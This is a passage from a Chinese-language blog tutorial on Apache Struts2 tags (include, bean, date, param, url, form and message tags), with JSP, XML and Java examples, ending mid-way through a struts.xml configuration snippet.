class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=utf-8"</span></span><br><span class="line">    pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@taglib</span> prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>&gt;</span><br><span class="line">&lt;title&gt;property标签&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;这是被包含页面includefile.jsp&lt;/h2&gt;&lt;br/&gt;</span><br><span class="line">    传递的参数为：&lt;%out.print(request.getParameter(<span class="string">"username"</span>)); %&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>includeTags.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@taglib</span> prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;includeTags&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;这是包含页面includeTags.jsp&lt;/h3&gt;&lt;br/&gt;</span><br><span class="line">&lt;s:include value=<span class="string">"file.jsp"</span>&gt;</span><br><span class="line">    &lt;s:param name=<span class="string">"username"</span> value=<span class="string">"'mi1k7ea'"</span>/&gt;</span><br><span class="line">&lt;/s:include&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="/2020/05/01/Struts2基础篇之标签/5.png" alt=""></p><h3 id="bean标签"><a href="#bean标签" class="headerlink" title="bean标签"></a>bean标签</h3><p>这些bean标签实例化一个符合JavaBeans规范的类。这个标签有一个主体，可以包含一些Param元素来设置任何mutator方法。如果在BeanTag上设置了var属性，它将把实例化的bean放入值栈的Context中。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:bean name=<span class="string">"org.apache.struts2.util.Counter"</span> <span class="keyword">var</span>=<span class="string">"counter"</span>&gt;</span><br><span class="line">   &lt;s:param name=<span class="string">"first"</span> value=<span class="string">"20"</span>/&gt;</span><br><span class="line">   &lt;s:param name=<span class="string">"last"</span> value=<span class="string">"25"</span> /&gt;</span><br><span class="line">&lt;/s:bean&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_bean_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_bean_tag.html</a></p><h3 id="date标签"><a href="#date标签" class="headerlink" title="date标签"></a>date标签</h3><p>date标签允许以快速简单的方式格式化日期。用户可以指定自定义日期格式（例如“dd/MM/yyyy hh:mm”），可以生成易读的符号（例如“在2小时14分钟内”），或者可以使用属性文件中的key:“struts.date.format”来回退到预定义的格式。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:date name=<span class="string">"person.birthday"</span> format=<span class="string">"dd/MM/yyyy"</span> /&gt;</span><br><span class="line">&lt;s:date name=<span class="string">"person.birthday"</span> format=<span class="string">"%&#123;getText('some.i18n.key')&#125;"</span> /&gt;</span><br><span class="line">&lt;s:date name=<span class="string">"person.birthday"</span> nice=<span class="string">"true"</span> /&gt;</span><br><span class="line">&lt;s:date name=<span class="string">"person.birthday"</span> /&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_date_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_date_tag.html</a></p><h3 id="param标签"><a href="#param标签" class="headerlink" title="param标签"></a>param标签</h3><p><code>&lt;s:param&gt;</code> 标签主要用于为其他标签提供参数，通常要与其他标签一起使用。在上一部分使用 <code>&lt;s:include&gt;</code> 标签时，就使用了 <code>&lt;s:param&gt;</code> 标签给被包含的页面传递参数。<code>&lt;s:param&gt;</code> 标签有两种用法，具体如下。</p><p>一种用法是通过标签体指定参数值，用法如下所示：  </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:param name="color"&gt;red&lt;/s:param&gt;</span><br></pre></td></tr></table></figure><p>另一种用法是使用 value 属性指定参数值，用法如下所示：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:param name=<span class="string">"color"</span> value=<span class="string">"'red'"</span>/&gt;</span><br></pre></td></tr></table></figure><p>上述两种用法的功能一样，不同点在于使用 value 属性设置参数值时，需要添加单引号，而使用标签体设置参数值时，不需要添加单引号。</p><p>注意：在使用 value 属性指定参数时，如果不添加单引号，则表示该值为一个引用对象，如果该对象不存在，则为其属性赋值为 null。  </p><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_param_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_param_tag.html</a></p><h3 id="push标签"><a href="#push标签" class="headerlink" title="push标签"></a>push标签</h3><p>这些push标签用于推送堆栈中的值，以简化使用。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:push value=<span class="string">"user"</span>&gt;</span><br><span class="line">    &lt;s:propery value=<span class="string">"firstName"</span> /&gt;</span><br><span class="line">    &lt;s:propery value=<span class="string">"lastName"</span> /&gt;</span><br><span class="line">&lt;/s:push&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_property_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_property_tag.html</a></p><h3 id="set标签"><a href="#set标签" class="headerlink" title="set标签"></a>set标签</h3><p>这些set标签为指定范围内的变量赋值。当你希望将变量分配给复杂表达式，然后仅仅引用该变量而不是复杂表达式时，它是很有用的。可应用的范围是应用程序，会话，请求，页面和action。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:set name=<span class="string">"myenv"</span> value=<span class="string">"environment.name"</span>/&gt;</span><br><span class="line">&lt;s:property value=<span class="string">"myenv"</span>/&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_property_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_property_tag.html</a></p><h3 id="text标签"><a href="#text标签" class="headerlink" title="text标签"></a>text标签</h3><p>这些text标签用于呈现I18n文本消息。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- First Example --&gt;</span><br><span class="line">&lt;s:i18n name=<span class="string">"struts.action.test.i18n.Shop"</span>&gt;</span><br><span class="line">    &lt;s:text name=<span class="string">"main.title"</span>/&gt;</span><br><span class="line">&lt;/s:i18n&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Second Example --&gt;</span><br><span class="line">&lt;s:text name=<span class="string">"main.title"</span> /&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Third Examlpe --&gt;</span><br><span class="line">&lt;s:text name=<span class="string">"i18n.label.greetings"</span>&gt;</span><br><span class="line">   &lt;s:param &gt;Mr Smith&lt;/s:param&gt;</span><br><span class="line">&lt;/s:text&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_text_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_text_tag.html</a></p><h3 id="url标签"><a href="#url标签" class="headerlink" title="url标签"></a>url标签</h3><p>这些url标签用于创建URL。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;-- Example <span class="number">1</span> --&gt;</span><br><span class="line">&lt;s:url value=<span class="string">"editGadget.action"</span>&gt;</span><br><span class="line">    &lt;s:param name=<span class="string">"id"</span> value=<span class="string">"%&#123;selected&#125;"</span> /&gt;</span><br><span class="line">&lt;/s:url&gt;</span><br><span class="line"></span><br><span class="line">&lt;-- Example <span class="number">2</span> --&gt;</span><br><span class="line">&lt;s:url action=<span class="string">"editGadget"</span>&gt;</span><br><span class="line">    &lt;s:param name=<span class="string">"id"</span> value=<span class="string">"%&#123;selected&#125;"</span> /&gt;</span><br><span class="line">&lt;/s:url&gt;</span><br><span class="line"></span><br><span class="line">&lt;-- Example <span class="number">3</span>--&gt;</span><br><span class="line">&lt;s:url includeParams=<span class="string">"get"</span>&gt;</span><br><span class="line">    &lt;s:param name=<span class="string">"id"</span> value=<span class="string">"%&#123;'22'&#125;"</span> /&gt;</span><br><span class="line">&lt;/s:url&gt;</span><br></pre></td></tr></table></figure><p>Demo参考：<a href="https://www.w3cschool.cn/struts_2/struts_url_tag.html" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/struts_url_tag.html</a></p><h3 id="a标签"><a href="#a标签" class="headerlink" title="a标签"></a>a标签</h3><p><code>&lt;s:a&gt;</code> 标签与 HTML 中的 <code>&lt;a&gt;</code> 标签类似，主要用于构造 HTML 页面中的超链接。<code>&lt;s:a&gt;</code> 标签的属性及相关说明如表所示。</p><p><img src="/2020/05/01/Struts2基础篇之标签/3.png" alt=""></p><p><code>&lt;s:a&gt;</code> 标签的使用格式如下所示：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:a href="链接地址"&gt;&lt;/s:a&gt;</span><br><span class="line">&lt;s:a namespace="" action=""&gt;www.baidu.com&lt;/s:a&gt;</span><br></pre></td></tr></table></figure><h3 id="debug标签"><a href="#debug标签" class="headerlink" title="debug标签"></a>debug标签</h3><p><code>&lt;s:debug&gt;</code> 标签用于输出服务端对象（如 request、application、ValueStack 等）中的信息，该标签可用于辅助调试 Java Web 程序。</p><p><code>&lt;s:debug&gt;</code> 标签只有一个 id 属性，表示 <code>&lt;s:debug&gt;</code> 标签的一个引用，通常不使用该属性。在使用 <code>&lt;s:debug&gt;</code>标签后，网页中会生成一个 Debug 的链接，单击该链接，网页中将输出各种服务器对象的信息，如图所示。</p><p><img src="/2020/05/01/Struts2基础篇之标签/4.png" alt=""></p><h2 id="0x04-表单标签"><a href="#0x04-表单标签" class="headerlink" title="0x04 表单标签"></a>0x04 表单标签</h2><p>表单标签列表是Struts UI标签的子集。Struts2 的表单标签用于向服务器提交用户输入的信息，绝大多数的表单标签都有其对应的 HTML 标签。</p><h3 id="Struts2的模板和主题"><a href="#Struts2的模板和主题" class="headerlink" title="Struts2的模板和主题"></a>Struts2的模板和主题</h3><p>Struts2 的 UI 标签都是基于模板和主题的。模板就是一些代码，Struts2 标签使用这些代码渲染生成相应的 HTML 代码。模板是一个 UI 标签的外在表现形式，并且每个标签都会有自己对应的模板。如果为所有的 UI 标签提供样式和视觉效果相似的模板，那么这一系列的模板就形成了一个主题。</p><p>Struts2 默认提供了四种主题，分别为 simple、xhtml、css_xhtml 和 Ajax，这四种主题的作用如下表所示。</p><table><thead><tr><th>名称</th><th>作用</th></tr></thead><tbody><tr><td>simple 主题</td><td>这是最简单的主题，使用该主题时，每个 UI 标签只生成最基本的 HTML 元素，没有任何附加功能。</td></tr><tr><td>xhtml 主题</td><td>这是 Struts2 的默认主题，它对 simple 主题进行了扩展，提供了布局功能、Label 显示名称以及与验证框架和国际化框架的集成。</td></tr><tr><td>css_xhtml</td><td>该主题是对 xhtml 的扩展，在 xhtml 的基础之上添加对 CSS 的支持和控制。</td></tr><tr><td>Ajax</td><td>继承自 xhtml，提供 Ajax 支持。</td></tr></tbody></table><p>在上述四种主题中，xhtml 是默认主题，但它有一定的局限性，因为它使用表格进行布局，并且只支持每一行放一个表单项，一旦遇到复杂的页面布局，xhtml 就不再适用了。此时，就需要改变 Struts2 的默认主题。</p><p>通常情况下，可以通过设置常量 struts.ui.theme 改变默认主题，具体方法是在 struts.xml 文件中增加相应的配置。例如想要使用 simple 的主题，那么只需要在 struts.xml 中增加如下配置即可。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.ui.theme"</span> <span class="attr">value</span>=<span class="string">"simple"</span>/&gt;</span></span><br></pre></td></tr></table></figure><h3 id="表单标签的公共属性"><a href="#表单标签的公共属性" class="headerlink" title="表单标签的公共属性"></a>表单标签的公共属性</h3><p>每一个表单标签在 Struts2 核心 JAR 文件的 org.apache.struts2.components 包中都有一个对应的类，这些对应的类都继承自 UIBean 类。</p><p>UIBean 类提供了一组公共属性，这些属性是所有表单标签的通用属性，具体如表所示。</p><table><thead><tr><th>属性名</th><th>主题</th><th>数据类型</th><th>说   明</th></tr></thead><tbody><tr><td>title</td><td>simple</td><td>String</td><td>设置表单元素的 title 属性</td></tr><tr><td>disabled</td><td>simple</td><td>String</td><td>设置表单元素是否可用</td></tr><tr><td>label</td><td>xhtml</td><td>String</td><td>设置表单元素的 label 属性</td></tr><tr><td>labelPosition</td><td>xhtml</td><td>String</td><td>设置 label 元素的显示位置，可选值为 top 和 left（默认）</td></tr><tr><td>name</td><td>simple</td><td>String</td><td>设置表单元素的 name 属性，与 Action 中的属性名对应</td></tr><tr><td>value</td><td>simple</td><td>String</td><td>设置表单元素的值</td></tr><tr><td>cssClass</td><td>simple</td><td>String</td><td>设置表单元素的 class</td></tr><tr><td>cssStyle</td><td>simple</td><td>String</td><td>设置表单元素的 style 属性</td></tr><tr><td>required</td><td>xhtml</td><td>Boolean</td><td>设置表单元素为必填项</td></tr><tr><td>requiredposition</td><td>xhtml</td><td>String</td><td>设置必填标记（默认为*）相对于 label 元素的位置，可选值为 left 和 right（默认）</td></tr><tr><td>tabindex</td><td>simple</td><td>String</td><td>设置表单元素的 tabindex 属性</td></tr></tbody></table><p>需要注意的是，表单标签的 name 和 value 属性基本等同于 HTML 组件的 name 和 value，但也有所不同：表单标签在生成 HTML 时，如果标签没有设置 value 属性，则会从值栈中按照 name 获取相应的值，并把这个值设置成 HTML 组件的 value。</p><p>简单而言，就是表单标签的 value 在生成 HTML 时会自动设置值，而这个值是从值栈中获取的。  </p><h3 id="form标签"><a href="#form标签" class="headerlink" title="form标签"></a>form标签</h3><p>form标签用于呈现 HTML 语言中的表单元素，其常用属性如表所示。</p><table><thead><tr><th>属性名</th><th>是否必填</th><th>类  型</th><th>说  明</th></tr></thead><tbody><tr><td>action</td><td>否</td><td>String</td><td>指定提交时对应的 action，不需要 action 后缀</td></tr><tr><td>enctype</td><td>否</td><td>String</td><td>HTML 表单 enctype 属性</td></tr><tr><td>method</td><td>否</td><td>String</td><td>HTML 表单 method 属性</td></tr><tr><td>namespace</td><td>否</td><td>String</td><td>所提交 action 的命名空间</td></tr></tbody></table><p>在使用form标签时，一般会包含其他的表单元素，如 textfield和radio等标签。在提交表单时，这些表单元素对应的 name 属性，将其作为参数传入 Struts2 框架进行处理。</p><h3 id="textfield和textarea标签"><a href="#textfield和textarea标签" class="headerlink" title="textfield和textarea标签"></a>textfield和textarea标签</h3><p>textfield和 textarea标签的作用比较相似，都用于创建文本框，其主要区别在于textfield创建的是单行文本框，而textarea创建的是多行文本框。二者的使用也比较简单，一般只需要指定其 label 和 name 属性即可。两个标签的用法如下所示。</p><p>textfield标签的用法：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:textfield label=<span class="string">"用户名"</span> name=<span class="string">"username"</span>/&gt;</span><br></pre></td></tr></table></figure><p>textarea标签的用法：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:textarea label=<span class="string">"描述"</span> name=<span class="string">"description"</span>/&gt;</span><br></pre></td></tr></table></figure><p>在上述两个用法中，name 属性用于指定单行/多行文本框的名称，在 Action 中，通过 name 属性即可获取单行/多行文本框的值。</p><p>此外，textarea标签还可以通过 value 属性指定单行/多行文本框的当前值，通过 cols 和 rows 属性分别指定多行文本框的列数和行数。</p><p>passWord标签</p><p>password标签用于创建一个密码输入框，它可以生成 HTML 中的 <code>&lt;input type=&quot;password&quot;/&gt;</code> 标签。</p><p>password标签的常用属性说明如表所示。</p><p><img src="/2020/05/01/Struts2基础篇之标签/7.png" alt=""></p><p>password标签的使用方法如下所示：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:password label=<span class="string">"password"</span> name=<span class="string">"password"</span> maxlength=<span class="string">"20"</span>/&gt;</span><br></pre></td></tr></table></figure><p>需要注意的是，Struts2 的 password 标签与 HTML 的 <code>input type=&quot;password&quot;/&gt;</code> 标签也略有不同：<code>&lt;input type=&quot;password&quot;/&gt;</code> 标签只要设置 value 属性就可以将 value 的属性值作为默认显示值；而 Struts2 的 password 标签除了要设置 value 属性值以外，还要设置 showPassword 属性值为 true。</p><h3 id="radio标签"><a href="#radio标签" class="headerlink" title="radio标签"></a>radio标签</h3><p>radio标签用于创建单选按钮，生成 HTML 中的 <code>&lt;input type=&quot;radio&quot;/&gt;</code> 标签。radio 标签的常用属性说明如表所示。</p><table><thead><tr><th>属性名</th><th>是否必填</th><th>类  型</th><th>说  明</th></tr></thead><tbody><tr><td>list</td><td>是</td><td>Collection，Map Enmumeration，Iterator，Array</td><td>用于生成单选框中的集合</td></tr><tr><td>listKey</td><td>否</td><td>String</td><td>指定集合对象中的哪个属性作为选项的 value</td></tr><tr><td>listValue</td><td>否</td><td>String</td><td>指定集合对象中的哪个属性作为选项的内容</td></tr></tbody></table><p>表中的三个属性必须要配合使用，由 list 属性指定从集合中获得元素，由 listKey 属性指定获得元素之后使用元素的哪个属性作为生成 <code>&lt;input type=&quot;radio&quot;/&gt;</code> 的 value 属性，由 listValue 属性指定生成的 <code>&lt;input type=&quot;radio&quot;/&gt;</code> 后展示给用户的内容。</p><h3 id="reset标签"><a href="#reset标签" class="headerlink" title="reset标签"></a>reset标签</h3><p>reset标签用于创建一个重置按钮，会生成 HTML 中的 <code>&lt;input type=&quot;reset&quot;/&gt;</code> 标签，该标签的使用比较简单，其常用属性为 name 和 value。</p><p>其中，name 属性用于指定重置按钮的名称，在 Action 中，可以通过 name 属性获取重置按钮的值，value 属性用于显示按钮的值。该标签的用法如下所示：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:reset value=<span class="string">"reset"</span>/&gt;</span><br><span class="line">&lt;s:reset name=<span class="string">"reset"</span> value=<span class="string">"重置"</span>/&gt;</span><br></pre></td></tr></table></figure><h3 id="submit标签"><a href="#submit标签" class="headerlink" title="submit标签"></a>submit标签</h3><p>submit标签主要用于产生 HTML 中的提交按钮，该表单元素中，可以指定提交时的 Action 对应的方法。该标签通常与 form 标签一起使用，该标签的常用属性如表所示。</p><p><img src="/2020/05/01/Struts2基础篇之标签/8.png" alt=""></p><p>checkboxlist标签</p><p>checkboxlist标签用于一次性创建多个复选框，用户可以选择创建零到多个复选框，它可以产生一组<code>&lt;input type=&quot;checkbox&quot;/&gt;</code>标签。</p><p>checkboxlist标签的常用属性及其说明如表所示。</p><p><img src="/2020/05/01/Struts2基础篇之标签/9.png" alt=""></p><p>在表的属性中，listKey 和 listValue 属性主要用于集合中，通常存放的是 JavaBean，可以使用这两个属性从 JavaBean 的众多属性中筛选需要的值。</p><h3 id="select标签"><a href="#select标签" class="headerlink" title="select标签"></a>select标签</h3><p>select标签用于创建一个下拉列表框，它会生成 HTML 中的 <code>&lt;select&gt;</code> 标签。select标签的常用属性及其说明如表所示。</p><p><img src="/2020/05/01/Struts2基础篇之标签/10.png" alt=""></p><p>在表的属性中，headerKey 和 headerValue 属性需要同时使用，使用时会在所有的真实选项之前加添一项作为标题项。如选择城市时，可以在所有的具体城市之前添加一项“请选择”，这一项不会作为备选的值。</p><p>size 属性可以让下拉框同时显示多个值，multiple 属性让用户同时选择多个值，只是在后台的 Action 接收下拉框值时，不能使用 String 类型，而是使用 <code>String[]</code> 或者 <code>List&lt;String&gt;</code>。</p><h3 id="optgroup标签"><a href="#optgroup标签" class="headerlink" title="optgroup标签"></a>optgroup标签</h3><p>optgroup标签用于生成选项组，通常作为 select 标签的子标签使用。由于在一个下拉列表框中可以包含多个选项组，所以 select 标签也能够包含多个 optgroup 标签。</p><p>使用 optgroup 标签时，也需要指定该标签的 list、listKey、listValue 等属性，这些属性的含义与 select 标签的相应属性含义相同。此外，optgroup 标签的 label 属性表示选项组的组名，选项组的组名是不能被选中的。</p><h3 id="file标签"><a href="#file标签" class="headerlink" title="file标签"></a>file标签</h3><p>file标签用于创建一个文件选择框，它会生成 HTML 中的 <code>&lt;input type=&quot;file&quot;/&gt;</code> 标签。该标签常用的属性及其说明如表所示。</p><p><img src="/2020/05/01/Struts2基础篇之标签/11.png" alt=""></p><p>file标签的一般用法如下所示：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:file name=<span class="string">"uploadFile"</span> accept=<span class="string">"text/*"</span>/&gt;</span><br><span class="line">&lt;s:file name=<span class="string">"otherUploadFile"</span> accept=<span class="string">"text/html,text/plain"</span>/&gt;</span><br></pre></td></tr></table></figure><h3 id="hidden标签"><a href="#hidden标签" class="headerlink" title="hidden标签"></a>hidden标签</h3><p>hidden标签用于创建隐藏表单元素，它会生成 HTML 中的隐藏域标签 <code>&lt;input type=&quot;hidden&quot;/&gt;</code>。该标签在页面上没有任何显示，可用于保存或交换数据，如需要提交表单时，要传递一个值到请求参数中，就可以使用该标签。</p><p>该标签的使用非常简单，通常只需要设置 name 和 value 属性即可，其使用语法如下所示：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:hidden name=<span class="string">"id"</span> value=<span class="string">"%&#123;id&#125;"</span>/&gt;</span><br></pre></td></tr></table></figure><h2 id="0x05-非表单标签"><a href="#0x05-非表单标签" class="headerlink" title="0x05 非表单标签"></a>0x05 非表单标签</h2><p>Struts2 的非表单标签主要用于在页面中生成非表单的可视化元素，以及输出在 Action 中封装的信息，如输出错误提示信息等。</p><p>常用的非表单标签有 <code>&lt;s:actionmessage&gt;</code>、<code>&lt;s:actionerror&gt;</code> 和 <code>&lt;s:fielderror&gt;</code> 标签，它们分别用于显示动作信息、动作错误信息和字段错误信息。如果信息为空，则不显示。各标签的具体功能介绍如下。</p><ul><li><code>&lt;s:actionmessage&gt;</code> 标签：如果 Action 实例的 getActionMessage() 方法返回不为 null，则该标签负责输出该方法返回的系列消息。</li><li><code>&lt;s:actionerror&gt;</code> 标签：如果 Action 实例的 getActionError() 方法返回不为 null，则该标签负责输出该方法返回的系列错误。</li><li><code>&lt;s:fielderror&gt;</code> 标签：如果 Action 实例存在表单域的类型转换错误和校验错误，则该标签负责输出这些错误提示。</li></ul><h3 id="Demo-2"><a href="#Demo-2" class="headerlink" title="Demo"></a>Demo</h3><p>新建MsgAction类，分别使用了addActionMessage、addActionError 和 addFieldError 三个方法输出错误信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MsgAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.addActionMessage(<span class="string">"&lt;s:actionmessage&gt;标签输出的内容"</span>);</span><br><span class="line">        <span class="keyword">this</span>.addActionError(<span class="string">"&lt;s:actionerror&gt;标签输出的内容"</span>);</span><br><span class="line">        <span class="keyword">this</span>.addFieldError(<span class="string">"msg"</span>, <span class="string">"&lt;s:fielderror&gt;标签输出的内容"</span>);</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建non_formTags.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@taglib</span> prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;errorTags&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;s:actionmessage/&gt;</span><br><span class="line">&lt;s:actionerror/&gt;</span><br><span class="line">&lt;s:fielderror/&gt;</span><br><span class="line">&lt;s:fielderror value=<span class="string">"msg"</span>/&gt;&lt;!-- 有无value效果一样 --&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>修改struts.xml文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></span><br><span class="line"><span class="meta">        "-//Apache Software Foundation//DTD Struts Configuration 2.3//EN"</span></span><br><span class="line"><span class="meta">        "http://struts.apache.org/dtds/struts-2.3.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 